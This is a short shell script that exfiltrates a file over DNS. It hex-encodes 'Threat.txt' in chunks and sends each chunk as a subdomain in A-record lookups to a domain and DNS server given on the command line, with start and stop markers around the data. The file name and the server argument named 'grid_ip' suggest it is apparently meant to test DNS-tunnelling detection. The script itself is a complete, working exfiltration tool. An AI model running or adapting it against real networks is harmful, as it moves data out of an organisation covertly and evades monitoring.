domain_name=$1;
grid_ip=$2;
echo $domain_name
echo $grid_ip 
if [ ! -e "Threat.txt" ]; then echo "File does not exists"; else i=0;host -t A 5468726561742e747874.1.jnoot0.txt.0.start.scr.b9570e22c2.$domain_name $grid_ip; hexdump -e '27/1 "%02x" "\n"' "Threat.txt" | (while read line; do host -t A $line"."$i".jnoot0.scr.b9570e22c2.$domain_name" $grid_ip;i=$(($i+1)) ; done ; host -t A 5468726561742e747874.1.jnoot0.txt.0.stop.scr.b9570e22c2.$domain_name $grid_ip; echo 'Segments sent: ' $i); fi
